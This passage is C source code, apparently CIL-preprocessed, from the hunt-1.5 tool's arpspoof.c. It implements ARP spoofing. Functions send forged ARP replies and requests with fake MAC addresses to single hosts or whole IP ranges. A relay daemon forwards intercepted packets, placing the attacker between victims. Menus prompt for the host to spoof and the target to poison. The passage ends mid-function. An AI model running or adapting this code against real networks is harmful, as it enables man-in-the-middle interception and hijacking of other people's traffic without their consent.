#line 492
    tj->j_arg = (void *)asi;
#line 493
    tj->j_arg_sec = refresh;
#line 494
    asi->tj_refresh = tj;
#line 495
    register_timejob_rel(tj, refresh);
    }
  } else {
#line 497
    asi->tj_refresh = (struct timejob *)((void *)0);
  }
#line 498
  return (asi);
}
}
#line 501 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
void force_arp_spoof(struct arp_spoof_info *asi , int count___0 ) 
{ 
  int i ;
  uint32_t tmp ;
  uint32_t tmp___0 ;

  {
#line 505
  if (asi->dst_mac_valid) {
#line 506
    i = 0;
    {
#line 506
    while (1) {
      while_continue: /* CIL Label */ ;
#line 506
      if (! (i < count___0)) {
#line 506
        goto while_break;
      }
      {
#line 507
      send_src_spoof_to_dst(asi);
#line 508
      tmp = ntohl(asi->dst_addr);
#line 508
      tmp___0 = htonl(tmp + 1U);
#line 508
      send_src_spoof_to_dst_through_request(asi, tmp___0);
#line 506
      i ++;
      }
    }
    while_break: /* CIL Label */ ;
    }
  } else {
    {
#line 511
    printf((char const   */* __restrict  */)"Warning: cannot try to force arp spoof while dst mac is not known\n");
    }
  }
#line 512
  return;
}
}
#line 514 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
void stop_arp_spoof(struct arp_spoof_info *asi ) 
{ 
  struct arp_spec as_dst ;
  unsigned char *asi_src_mac ;
  int i ;
  uint16_t tmp ;
  uint16_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  int tmp___3 ;

  {
#line 520
  (asi->use_count) --;
#line 520
  if (asi->use_count > 0) {
#line 521
    return;
  }
  {
#line 523
  list_remove(& l_arp_spoof, (void *)asi);
  }
#line 525
  if (asi->tj_refresh) {
    {
#line 526
    unregister_timejob(asi->tj_refresh);
#line 527
    free((void *)asi->tj_refresh);
#line 528
    asi->tj_refresh = (struct timejob *)((void *)0);
    }
  }
#line 530
  if (asi->tj_reply) {
    {
#line 531
    unregister_timejob(asi->tj_reply);
#line 532
    free((void *)asi->tj_reply);
#line 533
    asi->tj_reply = (struct timejob *)((void *)0);
    }
  }
#line 536
  if (asi->dst_mac_valid) {
#line 537
    if (asi->src_mac_valid) {
#line 538
      asi_src_mac = asi->src_mac;
    } else {
#line 540
      asi_src_mac = asi->src_fake_mac;
    }
#line 542
    if (arp_spoof_switch) {
#line 543
      if (arp_spoof_with_my_mac) {
#line 543
        as_dst.src_mac = (char *)(my_eth_mac);
      } else {
#line 543
        as_dst.src_mac = (char *)(asi->src_fake_mac);
      }
    } else
#line 546
    if (arp_spoof_with_my_mac) {
#line 546
      as_dst.src_mac = (char *)(my_eth_mac);
    } else {
#line 546
      as_dst.src_mac = (char *)asi_src_mac;
    }
    {
#line 548
    as_dst.dst_mac = (char *)(asi->dst_mac);
#line 549
    tmp = htons((uint16_t )2);
#line 549
    as_dst.oper = (int )tmp;
#line 550
    as_dst.sender_mac = (char *)asi_src_mac;
#line 551
    as_dst.sender_addr = (unsigned long )asi->src_addr;
#line 552
    as_dst.target_mac = (char *)(asi->dst_mac);
#line 553
    as_dst.target_addr = (unsigned long )asi->dst_addr;
#line 555
    i = 0;
    }
    {
#line 555
    while (1) {
      while_continue: /* CIL Label */ ;
#line 555
      if (! (i < arp_rr_count)) {
#line 555
        goto while_break;
      }
      {
#line 556
      send_arp_packet(& as_dst);
#line 555
      i ++;
      }
    }
    while_break: /* CIL Label */ ;
    }
#line 564
    if (arp_spoof_switch) {
#line 565
      if (arp_spoof_with_my_mac) {
#line 565
        as_dst.src_mac = (char *)(my_eth_mac);
      } else {
#line 565
        as_dst.src_mac = (char *)(asi->src_fake_mac);
      }
    } else
#line 568
    if (arp_spoof_with_my_mac) {
#line 568
      as_dst.src_mac = (char *)(my_eth_mac);
    } else {
#line 568
      as_dst.src_mac = (char *)asi_src_mac;
    }
    {
#line 570
    as_dst.src_mac = (char *)(asi->src_mac);
#line 571
    as_dst.dst_mac = (char *)(asi->dst_mac);
#line 572
    tmp___0 = htons((uint16_t )1);
#line 572
    as_dst.oper = (int )tmp___0;
#line 573
    as_dst.sender_mac = (char *)asi_src_mac;
#line 574
    as_dst.sender_addr = (unsigned long )asi->src_addr;
#line 575
    as_dst.target_mac = (char *)(mac_zero);
#line 576
    tmp___1 = ntohl(asi->dst_addr);
#line 576
    tmp___2 = htonl(tmp___1 + 1U);
#line 576
    as_dst.target_addr = (unsigned long )tmp___2;
#line 578
    i = 0;
    }
    {
#line 578
    while (1) {
      while_continue___0: /* CIL Label */ ;
#line 578
      if (! (i < arp_rr_count)) {
#line 578
        goto while_break___0;
      }
      {
#line 579
      send_arp_packet(& as_dst);
#line 578
      i ++;
      }
    }
    while_break___0: /* CIL Label */ ;
    }
  }
  {
#line 582
  list_lock(& l_arp_spoof);
#line 583
  tmp___3 = list_count(& l_arp_spoof);
  }
#line 583
  if (tmp___3 == 0) {
    {
#line 584
    list_remove(& l_ifunc_arp, (void *)(& ifunc_arp));
    }
  }
  {
#line 586
  list_unlock(& l_arp_spoof);
#line 588
  asi_wait_for_release(asi);
#line 589
  pthread_cond_destroy(& asi->lock_cond);
#line 590
  pthread_mutex_destroy(& asi->mutex);
#line 591
  free((void *)asi);
  }
#line 592
  return;
}
}
#line 598 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void func_relay(struct packet *p , void *arg ) 
{ 
  struct list_iterator li ;
  struct arp_spoof_info *asi ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;

  {
  {
#line 603
  list_lock(& l_arp_spoof);
#line 604
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 605
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 605
    tmp___1 = list_iter_get(& li);
#line 605
    asi = (struct arp_spoof_info *)tmp___1;
    }
#line 605
    if (! asi) {
#line 605
      goto while_break;
    }
#line 614
    if ((p->p_iph)->saddr == asi->dst_addr) {
#line 614
      goto _L___1;
    } else
#line 614
    if (asi->can_forward) {
      _L___1: /* CIL Label */ 
#line 614
      if ((p->p_iph)->daddr == asi->src_addr) {
#line 614
        goto _L___0;
      } else
#line 614
      if (asi->can_forward) {
        _L___0: /* CIL Label */ 
#line 614
        if (! asi->dst_mac_valid) {
#line 614
          goto _L;
        } else {
          {
#line 614
          tmp = memcmp((void const   *)((p->p_ethh)->h_source), (void const   *)(asi->dst_mac),
                       (size_t )6);
          }
#line 614
          if (tmp == 0) {
            _L: /* CIL Label */ 
            {
#line 614
            tmp___0 = memcmp((void const   *)((p->p_ethh)->h_dest), (void const   *)(asi->src_fake_mac),
                             (size_t )6);
            }
#line 614
            if (tmp___0 == 0) {
              {
#line 618
              packet_want(p);
#line 619
              asi_want(asi);
#line 620
              p->p_arg[3] = (void *)asi;
#line 621
              list_produce(& l_relay_pkt, (void *)p);
              }
#line 622
              goto while_break;
            }
          }
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 625
  list_iter_end(& li);
#line 626
  list_unlock(& l_arp_spoof);
  }
#line 627
  return;
}
}
#line 633 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int check_dont_relay(struct packet *p ) 
{ 
  struct arp_dont_relay *adr ;
  struct list_iterator li ;
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int dont_relay___0 ;
  void *tmp ;

  {
  {
#line 641
  iph = p->p_iph;
#line 642
  tcph = p->p_hdr.p_tcph;
#line 644
  dont_relay___0 = 0;
#line 645
  list_lock(& l_arp_dont_relay);
#line 646
  list_iter_set(& li, & l_arp_dont_relay);
  }
  {
#line 647
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 647
    tmp = list_iter_get(& li);
#line 647
    adr = (struct arp_dont_relay *)tmp;
    }
#line 647
    if (! adr) {
#line 647
      goto while_break;
    }
#line 648
    if (adr->src_addr == iph->saddr) {
#line 648
      if (adr->dst_addr == iph->daddr) {
#line 648
        if ((int )adr->src_port == (int )tcph->__annonCompField3.__annonCompField2.source) {
#line 648
          if ((int )adr->dst_port == (int )tcph->__annonCompField3.__annonCompField2.dest) {
#line 652
            dont_relay___0 = 1;
#line 653
            goto while_break;
          }
        }
      }
    }
#line 655
    if (adr->src_addr == iph->daddr) {
#line 655
      if (adr->dst_addr == iph->saddr) {
#line 655
        if ((int )adr->src_port == (int )tcph->__annonCompField3.__annonCompField2.dest) {
#line 655
          if ((int )adr->dst_port == (int )tcph->__annonCompField3.__annonCompField2.source) {
#line 659
            dont_relay___0 = 1;
#line 660
            goto while_break;
          }
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 663
  list_iter_end(& li);
#line 664
  list_unlock(& l_arp_dont_relay);
  }
#line 665
  return (dont_relay___0);
}
}
#line 668 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void print_relay_packet(char const   *label , struct packet *p , int print_mac ) 
{ 


  {
#line 694
  return;
}
}
#line 701 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void relay_modify_hook(struct packet *p_new ) 
{ 


  {
#line 726
  return;
}
}
#line 728 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void *arp_relay(void *arg ) 
{ 
  struct packet *p ;
  struct packet *p_new ;
  struct arp_spoof_info *asi ;
  struct arp_spoof_info *asi_dst___0 ;
  struct list_iterator li ;
  struct iphdr *iph ;
  struct mac_info *mi_src ;
  int found ;
  __pid_t tmp ;
  int tmp___0 ;
  int tmp___1 ;
  void *tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 735
  found = 0;
#line 737
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 738
  tmp = getpid();
#line 738
  setpriority(0, (id_t )tmp, 10);
  }
  {
#line 739
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 739
    tmp___3 = list_consume(& l_relay_pkt, (struct timespec  const  *)((void *)0));
#line 739
    p = (struct packet *)tmp___3;
    }
#line 739
    if (! p) {
#line 739
      goto while_break;
    }
#line 740
    asi = (struct arp_spoof_info *)p->p_arg[3];
#line 741
    if (! asi->src_mac_valid) {
      {
#line 742
      mi_src = mac_info_get(asi->src_addr);
      }
#line 742
      if (mi_src) {
        {
#line 743
        memcpy((void */* __restrict  */)(asi->src_mac), (void const   */* __restrict  */)(mi_src->mac),
               (size_t )6);
#line 744
        asi->src_mac_valid = 1;
#line 745
        mac_info_release(mi_src);
        }
      } else {
        {
#line 748
        mac_discover(asi->src_addr, 1);
        }
      }
      {
#line 752
      asi_release(asi);
#line 753
      packet_free(p);
      }
#line 754
      goto while_continue;
    }
#line 756
    if (! asi->dst_mac_valid) {
      {
#line 757
      memcpy((void */* __restrict  */)(asi->dst_mac), (void const   */* __restrict  */)((p->p_ethh)->h_source),
             (size_t )6);
#line 758
      asi->dst_mac_valid = 1;
      }
    }
    {
#line 760
    tmp___0 = check_dont_relay(p);
    }
#line 760
    if (tmp___0) {
      {
#line 761
      print_relay_packet("arp_realyer drop", p, 0);
#line 762
      asi_release(asi);
#line 763
      packet_free(p);
      }
#line 764
      goto while_continue;
    }
    {
#line 767
    tmp___1 = process_pktrelay(p, asi);
    }
#line 767
    if (tmp___1) {
      {
#line 768
      print_relay_packet("arp_relayer pktrelay", p, 0);
#line 769
      asi_release(asi);
#line 770
      packet_free(p);
      }
#line 771
      goto while_continue;
    }
    {
#line 773
    p_new = packet_new();
#line 774
    packet_copy_data(p_new, p);
#line 775
    packet_free(p);
#line 776
    p = p_new;
#line 777
    iph = p->p_iph;
#line 779
    memcpy((void */* __restrict  */)((p->p_ethh)->h_dest), (void const   */* __restrict  */)(asi->src_mac),
           (size_t )6);
#line 780
    asi_release(asi);
#line 782
    found = 0;
#line 783
    list_iter_set(& li, & l_arp_spoof);
    }
    {
#line 784
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 784
      tmp___2 = list_iter_get(& li);
#line 784
      asi_dst___0 = (struct arp_spoof_info *)tmp___2;
      }
#line 784
      if (! asi_dst___0) {
#line 784
        goto while_break___0;
      }
#line 785
      if (iph->saddr == asi_dst___0->src_addr) {
#line 785
        if (iph->daddr == asi_dst___0->dst_addr) {
          {
#line 787
          memcpy((void */* __restrict  */)((p->p_ethh)->h_source), (void const   */* __restrict  */)(asi_dst___0->src_fake_mac),
                 (size_t )6);
#line 788
          found = 1;
          }
#line 789
          goto while_break___0;
        }
      }
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 792
    list_iter_end(& li);
    }
#line 793
    if (arp_spoof_switch) {
#line 793
      if (! found) {
        {
#line 796
        memcpy((void */* __restrict  */)((p->p_ethh)->h_source), (void const   */* __restrict  */)(my_eth_mac),
               (size_t )6);
        }
      }
    }
    {
#line 798
    print_relay_packet("arp_relayer got", p, 1);
#line 800
    relay_modify_hook(p_new);
#line 802
    send_packet(p_new);
#line 803
    packet_free(p_new);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 805
  return ((void *)0);
}
}
#line 808 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int start_arp_relayer(void) 
{ 


  {
  {
#line 810
  list_produce_start(& l_relay_pkt);
  }
#line 811
  if (relayer_running) {
    {
#line 812
    printf((char const   */* __restrict  */)"daemon already running\n");
    }
#line 813
    return (-1);
  }
  {
#line 815
  pthread_create((pthread_t */* __restrict  */)(& relay_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 & arp_relay, (void */* __restrict  */)((void *)0));
#line 816
  ifunc_relay.func = & func_relay;
#line 817
  ifunc_relay.arg = (void *)0;
#line 818
  list_enqueue(& l_ifunc_ip, (void *)(& ifunc_relay));
#line 819
  relayer_running = 1;
#line 820
  printf((char const   */* __restrict  */)"daemon started\n");
  }
#line 821
  return (0);
}
}
#line 824 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int stop_arp_relayer(void) 
{ 
  struct packet *p ;
  struct arp_spoof_info *asi ;
  void *tmp ;

  {
#line 829
  if (! relayer_running) {
    {
#line 830
    printf((char const   */* __restrict  */)"daemon isn\'t running\n");
    }
#line 831
    return (-1);
  }
  {
#line 833
  list_remove(& l_ifunc_ip, (void *)(& ifunc_relay));
  }
  {
#line 835
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 835
    tmp = list_pop(& l_relay_pkt);
#line 835
    p = (struct packet *)tmp;
    }
#line 835
    if (! p) {
#line 835
      goto while_break;
    }
    {
#line 836
    asi = (struct arp_spoof_info *)p->p_arg[3];
#line 837
    asi_release(asi);
#line 838
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 840
  list_produce_done(& l_relay_pkt);
#line 841
  pthread_join(relay_thr, (void **)((void *)0));
#line 842
  relayer_running = 0;
#line 843
  printf((char const   */* __restrict  */)"daemon stopped\n");
  }
#line 844
  return (0);
}
}
#line 847 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
void print_arp_relayer_daemon(void) 
{ 
  int tmp ;

  {
#line 849
  if (relayer_running) {
    {
#line 850
    tmp = pthread_kill(relay_thr, 0);
    }
#line 850
    if (tmp != 0) {
      {
#line 851
      pthread_join(relay_thr, (void **)((void *)0));
#line 852
      relay_thr = (pthread_t )0;
#line 853
      relayer_running = 0;
#line 854
      set_tty_color((enum TTY_COLOR )9);
#line 855
      printf((char const   */* __restrict  */)"ARP relayer daemon failed - bug\n");
#line 856
      set_tty_color((enum TTY_COLOR )7);
      }
    } else {
      {
#line 858
      printf((char const   */* __restrict  */)"Y");
      }
    }
  }
#line 860
  return;
}
}
#line 865 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int start_arp_spoof_range(struct arp_spoof_range *asr ) 
{ 
  struct mac_info *mi_src ;
  struct mac_info *mi_dst ;
  struct arp_spoof_info *asi ;
  unsigned int dst_addr ;
  int count___0 ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  int tmp___2 ;
  void *tmp___3 ;
  uint32_t tmp___4 ;
  char *tmp___5 ;
  char *tmp___6 ;
  int tmp___7 ;
  uint32_t tmp___8 ;
  uint32_t tmp___9 ;

  {
  {
#line 870
  count___0 = 0;
#line 872
  mi_src = mac_info_get(asr->src_addr);
  }
#line 872
  if (! mi_src) {
    {
#line 873
    mac_discover(asr->src_addr, 2);
    }
  }
#line 874
  dst_addr = asr->dst_start_addr;
  {
#line 874
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 874
    tmp___0 = ntohl(dst_addr);
#line 874
    tmp___1 = ntohl(asr->dst_end_addr);
    }
#line 874
    if (! (tmp___0 <= tmp___1)) {
#line 874
      goto while_break;
    }
    {
#line 875
    count___0 ++;
#line 876
    mi_dst = mac_info_get(dst_addr);
    }
#line 876
    if (mi_dst) {
      {
#line 879
      mac_info_release(mi_dst);
      }
    } else {
      {
#line 877
      mac_discover(dst_addr, 2);
      }
    }
    {
#line 874
    tmp = ntohl(dst_addr);
#line 874
    dst_addr = htonl(tmp + 1U);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 881
  sec_nanosleep(1);
  }
#line 882
  if (! mi_src) {
    {
#line 883
    mi_src = mac_info_get(asr->src_addr);
    }
  }
#line 884
  if (! mi_src) {
    {
#line 885
    tmp___2 = menu_choose_yn((char *)"src mac isn\'t known - continue? y/n", 0);
    }
#line 885
    if (tmp___2 <= 0) {
#line 886
      return (-1);
    }
  }
  {
#line 888
  tmp___3 = malloc((unsigned long )count___0 * sizeof(struct arp_spoof_info *));
#line 888
  asr->asi = (struct arp_spoof_info **)tmp___3;
#line 889
  asr->asi_count = 0;
#line 890
  dst_addr = asr->dst_start_addr;
  }
  {
#line 890
  while (1) {
    while_continue___0: /* CIL Label */ ;
    {
#line 890
    tmp___8 = ntohl(dst_addr);
#line 890
    tmp___9 = ntohl(asr->dst_end_addr);
    }
#line 890
    if (! (tmp___8 <= tmp___9)) {
#line 890
      goto while_break___0;
    }
    {
#line 891
    mi_dst = mac_info_get(dst_addr);
    }
#line 892
    if (mi_dst) {
#line 892
      tmp___5 = mi_dst->mac;
    } else {
#line 892
      tmp___5 = (char *)((void *)0);
    }
#line 892
    if (mi_src) {
#line 892
      tmp___6 = mi_src->mac;
    } else {
#line 892
      tmp___6 = (char *)((void *)0);
    }
    {
#line 892
    asi = start_arp_spoof(asr->src_addr, dst_addr, tmp___6, tmp___5, asr->src_fake_mac,
                          asr->refresh, asr->can_forward, 1);
    }
#line 896
    if (! asi) {
      {
#line 897
      fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"error: start_arp_spoof_range: asi == NULL\n");
      }
    }
#line 898
    if (mi_dst) {
      {
#line 899
      mac_info_release(mi_dst);
      }
    }
    {
#line 900
    tmp___7 = asr->asi_count;
#line 900
    (asr->asi_count) ++;
#line 900
    *(asr->asi + tmp___7) = asi;
#line 890
    tmp___4 = ntohl(dst_addr);
#line 890
    dst_addr = htonl(tmp___4 + 1U);
    }
  }
  while_break___0: /* CIL Label */ ;
  }
#line 902
  if (mi_src) {
    {
#line 903
    mac_info_release(mi_src);
    }
  }
#line 904
  return (0);
}
}
#line 907 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void stop_arp_spoof_range(struct arp_spoof_range *asr ) 
{ 
  int i ;

  {
#line 911
  i = 0;
  {
#line 911
  while (1) {
    while_continue: /* CIL Label */ ;
#line 911
    if (! (i < asr->asi_count)) {
#line 911
      goto while_break;
    }
    {
#line 912
    stop_arp_spoof(*(asr->asi + i));
#line 911
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 913
  free((void *)asr->asi);
  }
#line 914
  return;
}
}
#line 919 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int arp_spoof_list_items(void) 
{ 
  struct list_iterator li ;
  struct arp_spoof_info *asi ;
  char buf[512] ;
  int i ;
  char *tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  void *tmp___2 ;

  {
  {
#line 924
  i = 0;
#line 926
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 927
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 927
    tmp___2 = list_iter_get(& li);
#line 927
    asi = (struct arp_spoof_info *)tmp___2;
    }
#line 927
    if (! asi) {
#line 927
      goto while_break;
    }
#line 928
    if (asi->in_range) {
#line 929
      goto while_break;
    }
    {
#line 930
    sprintf_eth_mac(buf, asi->src_fake_mac);
#line 931
    tmp = host_lookup(asi->src_addr, hl_mode);
#line 931
    tmp___0 = host_lookup(asi->dst_addr, hl_mode);
#line 931
    tmp___1 = i;
#line 931
    i ++;
#line 931
    printf((char const   */* __restrict  */)"%2d) on %-16s is %-16s as %s refresh %ds\n",
           tmp___1, tmp___0, tmp, buf, asi->refresh);
    }
#line 935
    if (i % lines_o == 0) {
      {
#line 936
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 938
  list_iter_end(& li);
  }
#line 939
  return (i);
}
}
#line 942 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int arp_spoof_range_list(void) 
{ 
  struct list_iterator li ;
  struct arp_spoof_range *asr ;
  char buf[512] ;
  int i ;
  char *tmp ;
  char *tmp___0 ;
  char *tmp___1 ;
  int tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 947
  i = 0;
#line 949
  list_iter_set(& li, & l_arp_spoof_range);
  }
  {
#line 950
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 950
    tmp___3 = list_iter_get(& li);
#line 950
    asr = (struct arp_spoof_range *)tmp___3;
    }
#line 950
    if (! asr) {
#line 950
      goto while_break;
    }
    {
#line 951
    sprintf_eth_mac(buf, (unsigned char *)(asr->src_fake_mac));
#line 952
    tmp = host_lookup(asr->src_addr, hl_mode);
#line 952
    tmp___0 = host_lookup(asr->dst_end_addr, 0);
#line 952
    tmp___1 = host_lookup(asr->dst_start_addr, 0);
#line 952
    tmp___2 = i;
#line 952
    i ++;
#line 952
    printf((char const   */* __restrict  */)"%2d) on %s - %s is %-16s as %s refresh %ds\n",
           tmp___2, tmp___1, tmp___0, tmp, buf, asr->refresh);
    }
#line 957
    if (i % lines_o == 0) {
      {
#line 958
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 960
  list_iter_end(& li);
  }
#line 961
  return (i);
}
}
#line 964 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_add_item(void) 
{ 
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned char src_fake_mac[6] ;
  struct mac_info *mi_src ;
  struct mac_info *mi_dst ;
  struct arp_spoof_info *asi_src_in_dst ;
  char buf[512] ;
  int refresh ;
  int can_forward ;
  unsigned char *tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  char *tmp___3 ;
  char *tmp___4 ;
  int tmp___5 ;

  {
  {
#line 973
  src_ip = menu_choose_hostname((char *)"host to spoof", (char *)((void *)0));
  }
#line 973
  if (src_ip == 4294967295U) {
#line 974
    return;
  }
  {
#line 975
  tmp = suggest_mac();
#line 975
  sprintf_eth_mac(buf, tmp);
#line 976
  tmp___0 = menu_choose_mac((char *)"fake mac", src_fake_mac, buf);
  }
#line 976
  if (tmp___0 < 0) {
#line 977
    return;
  }
#line 978
  if (can_forward_question) {
    {
#line 979
    can_forward = menu_choose_yn((char *)"is host IP router y/n", 0);
    }
#line 979
    if (can_forward < 0) {
#line 980
      return;
    }
  } else {
#line 982
    can_forward = 1;
  }
  {
#line 983
  dst_ip = menu_choose_hostname((char *)"target - where to insert the spoof", (char *)((void *)0));
  }
#line 983
  if (dst_ip == 4294967295U) {
#line 984
    return;
  }
  {
#line 985
  refresh = menu_choose_unr((char *)"refresh interval sec", 0, 100000, 0);
  }
#line 985
  if (refresh < 0) {
#line 986
    return;
  }
  {
#line 988
  mi_src = mac_info_get(src_ip);
  }
#line 988
  if (! mi_src) {
    {
#line 989
    mac_discover(src_ip, 2);
#line 990
    sec_nanosleep(1);
#line 991
    mi_src = mac_info_get(src_ip);
    }
#line 991
    if (! mi_src) {
      {
#line 992
      tmp___1 = menu_choose_yn((char *)"src mac isn\'t known - continue? y/n", 0);
      }
#line 992
      if (tmp___1 <= 0) {
#line 993
        return;
      }
    }
  }
  {
#line 996
  mi_dst = mac_info_get(dst_ip);
  }
#line 996
  if (! mi_dst) {
    {
#line 997
    mac_discover(dst_ip, 2);
#line 998
    sec_nanosleep(1);
#line 999
    mi_dst = mac_info_get(dst_ip);
    }
#line 999
    if (! mi_dst) {
      {
#line 1000
      tmp___2 = menu_choose_yn((char *)"dst mac isn\'t known - continue? y/n", 0);
      }
#line 1000
      if (tmp___2 <= 0) {
#line 1001
        if (mi_src) {
          {
#line 1002
          mac_info_release(mi_src);
          }
        }
#line 1003
        return;
      }
    }
  }
#line 1007
  if (mi_dst) {
#line 1007
    tmp___3 = mi_dst->mac;
  } else {
#line 1007
    tmp___3 = (char *)((void *)0);
  }
#line 1007
  if (mi_src) {
#line 1007
    tmp___4 = mi_src->mac;
  } else {
#line 1007
    tmp___4 = (char *)((void *)0);
  }
  {
#line 1007
  asi_src_in_dst = start_arp_spoof(src_ip, dst_ip, tmp___4, tmp___3, (char *)(src_fake_mac),
                                   refresh, can_forward, 0);
  }
#line 1010
  if (mi_src) {
    {
#line 1011
    mac_info_release(mi_src);
    }
  }
#line 1012
  if (mi_dst) {
    {
#line 1013
    mac_info_release(mi_dst);
#line 1014
    tmp___5 = user_arpspoof_test(asi_src_in_dst);
    }
#line 1014
    if (tmp___5) {
      {
#line 1015
      user_run_arpspoof_until_successed(asi_src_in_dst);
      }
    }
  }
#line 1017
  return;
}
}
#line 1019 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_range_add(void) 
{ 
  unsigned int src_ip ;
  unsigned int dst_start_ip ;
  unsigned int dst_end_ip ;
  unsigned char src_fake_mac[6] ;
  struct arp_spoof_range *asr ;
  char buf[512] ;
  int refresh ;
  int can_forward ;
  unsigned char *tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  int tmp___2 ;

  {
  {
#line 1027
  src_ip = menu_choose_hostname((char *)"host to spoof", (char *)((void *)0));
  }
#line 1027
  if (src_ip == 4294967295U) {
#line 1028
    return;
  }
  {
#line 1029
  tmp = suggest_mac();
#line 1029
  sprintf_eth_mac(buf, tmp);
#line 1030
  tmp___0 = menu_choose_mac((char *)"fake mac", src_fake_mac, buf);
  }
#line 1030
  if (tmp___0 < 0) {
#line 1031
    return;
  }
#line 1032
  if (can_forward_question) {
    {
#line 1033
    can_forward = menu_choose_yn((char *)"is host IP router y/n", 0);
    }
#line 1033
    if (can_forward < 0) {
#line 1034
      return;
    }
  } else {
#line 1036
    can_forward = 1;
  }
  {
#line 1037
  dst_start_ip = menu_choose_hostname((char *)"start target where to insert the spoof",
                                      (char *)((void *)0));
  }
#line 1037
  if (dst_start_ip == 4294967295U) {
#line 1038
    return;
  }
  {
#line 1039
  dst_end_ip = menu_choose_hostname((char *)"end target where to insert the spoof",
                                    (char *)((void *)0));
  }
#line 1039
  if (dst_end_ip == 4294967295U) {
#line 1040
    return;
  }
  {
#line 1041
  refresh = menu_choose_unr((char *)"refresh interval sec", 0, 100000, 0);
  }
#line 1041
  if (refresh < 0) {
#line 1042
    return;
  }
  {
#line 1043
  tmp___1 = malloc(sizeof(struct arp_spoof_range ));
#line 1043
  asr = (struct arp_spoof_range *)tmp___1;
  }
#line 1044
  if (! asr) {
    {
#line 1044
    __assert_fail("asr", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c",
                  1044U, "arp_spoof_range_add");
    }
  }
  {
#line 1045
  memset((void *)asr, 0, sizeof(*asr));
#line 1046
  asr->asi = (struct arp_spoof_info **)((void *)0);
#line 1047
  asr->asi_count = 0;
#line 1048
  asr->dst_start_addr = dst_start_ip;
#line 1049
  asr->dst_end_addr = dst_end_ip;
#line 1050
  asr->src_addr = src_ip;
#line 1051
  memcpy((void */* __restrict  */)(asr->src_fake_mac), (void const   */* __restrict  */)(src_fake_mac),
         (size_t )6);
#line 1052
  asr->refresh = refresh;
#line 1053
  asr->can_forward = can_forward;
#line 1054
  tmp___2 = start_arp_spoof_range(asr);
  }
#line 1054
  if (tmp___2 < 0) {
    {
#line 1055
    free((void *)asr);
    }
#line 1056
    return;
  }
  {
#line 1058
  list_enqueue(& l_arp_spoof_range, (void *)asr);
  }
#line 1059
  return;
}
}
#line 1062 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static int arp_spoof_count(void) 
{ 
  struct list_iterator li ;
  struct arp_spoof_info *asi ;
  int count___0 ;
  void *tmp ;

  {
  {
#line 1068
  count___0 = 0;
#line 1069
  list_iter_set(& li, & l_arp_spoof);
  }
  {
#line 1070
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 1070
    tmp = list_iter_get(& li);
#line 1070
    asi = (struct arp_spoof_info *)tmp;
    }
#line 1070
    if (! asi) {
#line 1070
      goto while_break;
    }
#line 1071
    if (asi->in_range) {
#line 1072
      goto while_break;
    }
#line 1073
    count___0 ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 1075
  list_iter_end(& li);
  }
#line 1076
  return (count___0);
}
}
#line 1079 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/arpspoof.c"
static void arp_spoof_del_item(void) 
{ 
  int i ;
  struct arp_spoof_info *asi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 1084
  arp_spoof_list_items();
#line 1085
  tmp = arp_spoof_count();
#line 1085
